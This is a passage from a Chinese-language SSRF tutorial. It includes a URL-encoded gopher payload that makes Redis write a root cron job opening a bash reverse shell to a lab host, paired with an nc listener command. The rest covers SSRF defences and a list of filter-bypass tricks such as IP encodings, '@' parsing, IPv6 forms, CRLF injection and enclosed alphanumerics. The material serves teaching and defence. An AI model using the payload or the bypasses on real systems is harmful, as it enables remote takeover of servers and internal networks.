gopher%3a%2f%2f192.168.239.140%3a6379%2f_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252470%250D%250A%250A%250A%252A/1%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-c%2520%2522sh%2520-i%2520%253E%2526%2520/dev/tcp/192.168.239.133/1234%25200%253E%25261%2522%250A%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252416%250D%250A/var/spool/cron/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

在监听主机上开启监听：

```bash
nc -lvp 1234
```

把payload放在存在SSRF的网页：

![SSRF利用gopher payload](/assets/images/17/image-20260725220250225.png)

---

## SSRF漏洞防御手法

1. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件，那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
2. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
3. 限制请求的端口为http常用的端口，比如 80、443、8080、8090。
4. 防火墙策略，内网ip设置黑名单。避免应用被用来获取内网数据，攻击内网。
5. 禁用不需要的协议。仅仅允许http和https请求。可以防止类似于 `file:///`、`gopher://`、`ftp://` 等引起的问题。
6. url网址写死，固定几个网址，其他网址一律不允许访问，设置白名单。

---

## SSRF绕过

### 限制为 http://www.xxx.com 域名时（利用@）

可以尝试采用http基本身份认证的方式绕过。

如：`http://www.aaa.com@www.bbb.com@www.ccc.com`，在对 `@` 解析域名中，不同的处理函数存在处理差异：在PHP的 `parse_url` 中会识别 `www.ccc.com`，而 `libcurl` 则识别为 `www.bbb.com`。

---

### 采用短网址绕过（URL短链接）

- <https://monojson.com/zh/generators/short-link-generator>
- <https://dwz.cn/>

有很多在线网站就能帮我们的网址转换为url短链接形式，原理就是当请求这个短链接的时候，url短链接提供商的服务器先解析一下对应的真实url，然后拿到真实url之后再发起访问，这样提交的数据看不到真实url，用来绕过后端代码对网址的过滤，所以url短链接经常用于攻击行为和钓鱼行为等。

---

### 采用进制转换

`127.0.0.1` 的八进制：`0177.0.0.1`。十六进制：`0x7f.0.0.1`。十进制：`2130706433`。

---

### 利用特殊域名

原理是DNS解析。`xip.io` 可以指向任意域名，即 `127.0.0.1.xip.io`，可解析为 `127.0.0.1`。

> 💡 `xip.io` 现在好像用不了了，可以找找其他的。

---

### 利用 [::] IPv6绕过

可以利用 `[::]` 来绕过 `localhost`：

`http://169.254.169.254` → `http://[::169.254.169.254]`

> 💡 这种写法是IPv6的地址写法，只要对方支持IPv6的ip地址访问就行，需要配置才行，比如nginx就可以配置IPv6来访问。

---

### 利用句号

`127。0。0。1` → `127.0.0.1`

比如：`ping 127。0。0。1`

> ⚠️ 注意，linux系统才能识别，windows系统不能识别。

---

### CRLF 编码绕过

- `%0d` → `0x0d` → `\r` 回车
- `%0a` → `0x0a` → `\n` 换行

进行HTTP头部注入：

```url
example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a
```

---

### 利用封闭的字母数字

利用Enclosed Alphanumerics，有些输入法直接就可以输入这样的封闭字符：

```
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  →  example.com
```

```
http://169.254.169.254  →  http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]
```

List：

```
①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳
⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇
⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛
⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵
ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏ
ⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ
⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴
⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿
```

---

## SSRF常见限制

### 限制为 http://www.xxx.com 域名

采用http基本身份认证的方式绕过，即 `@`：

```url
http://www.xxx.com@www.xxc.com
```

### 限制请求IP不为内网地址

当不允许ip为内网地址时：

1. 采取短网址绕过
2. 采取特殊域名
3. 采取进制转换

### 限制请求只为http协议

1. 采取302跳转 https → http
2. 采取短地址
